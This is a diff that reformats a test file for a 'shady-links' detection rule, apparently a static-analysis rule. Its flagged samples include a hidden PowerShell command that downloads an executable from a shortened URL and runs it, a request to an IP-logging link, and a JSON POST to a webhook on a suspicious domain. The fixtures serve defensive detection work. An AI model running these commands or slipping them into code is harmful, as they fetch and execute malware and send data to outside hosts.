@@ -38,7 +38,7 @@ ref:http://bit.ly/2gK6bXK
 """
 # ok: shady-links
 SECURE_ORIGINS: List[SecureOrigin] = [
-    # protocol, hostname, port\n    
+    # protocol, hostname, port\n
     # Taken from Chrome\'s list of secure origins (See: http://bit.ly/1qrySKC)
     ("https", "*", "*"),
     ("*", "localhost", "*"),
@@ -46,26 +46,29 @@ SECURE_ORIGINS: List[SecureOrigin] = [
     ("*", "::1/128", "*"),
     ("file", "*", None),
     # ssh is always secure.
-    ("ssh", "*", "*")]
+    ("ssh", "*", "*"),
+]
 
 
 """ RULEID: url shorteners
 """
-# ruleid: shady-links    
-os.system("powershell -window hidden -executionpolicy bypass (New-object system.net.webclient).DownloadFile('http://bit.ly/2myCV9n',$env:APPDATA+'\Main.exe'); Start-Process $env:APPDATA'\Main.exe'")
+os.system(
+    # ruleid: shady-links
+    "powershell -window hidden -executionpolicy bypass (New-object system.net.webclient).DownloadFile('http://bit.ly/2myCV9n',$env:APPDATA+'\Main.exe'); Start-Process $env:APPDATA'\Main.exe'"
+)
 
 
 """ RULEID: free domain extensions
 """
 
-# ruleid: shady-links     
-req = urllib3.Request('https://grabify.link/E09EIF', headers={'User-Agent' : os})
+# ruleid: shady-links
+req = urllib3.Request("https://grabify.link/E09EIF", headers={"User-Agent": os})
 
 # todoruleid: shady-links
 request(
     # todoruleid: shady-links
-    url='http://us.dslab.pw/webhook.php',
-    method='POST',
-    data=json.dumps(data).encode("utf-8", errors='ignore'),
-    headers=headers
+    url="http://us.dslab.pw/webhook.php",
+    method="POST",
+    data=json.dumps(data).encode("utf-8", errors="ignore"),
+    headers=headers,
 )
